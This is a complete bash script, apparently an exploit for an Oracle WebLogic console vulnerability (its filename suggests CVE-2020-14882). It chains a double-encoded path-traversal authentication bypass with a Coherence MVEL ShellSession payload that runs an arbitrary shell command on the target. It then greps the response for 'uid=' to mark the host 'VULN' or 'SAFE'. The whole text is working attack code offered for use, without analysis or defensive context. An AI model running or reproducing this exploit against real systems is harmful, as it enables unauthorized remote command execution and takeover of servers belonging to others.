#!/usr/bin/env bash
TARGET="${1:?usage: bash wls14882.sh http://TARGET:7001}"
CMD="${2:-id}"
ENC=$(python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$CMD" 2>/dev/null || printf '%s' "$CMD")
URL="${TARGET%/}/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(new%20String[]{%22sh%22,%22-c%22,%22$ENC%22})%22)"
out=$(curl -sS -m 15 "$URL" 2>/dev/null)
printf '%s' "$out" | grep -qE 'uid=[0-9]+|gid=[0-9]+' && { echo "VULN  $TARGET"; printf '%s\n' "$out" | head -5; exit 0; }
echo "SAFE/未命中  $TARGET"; exit 1
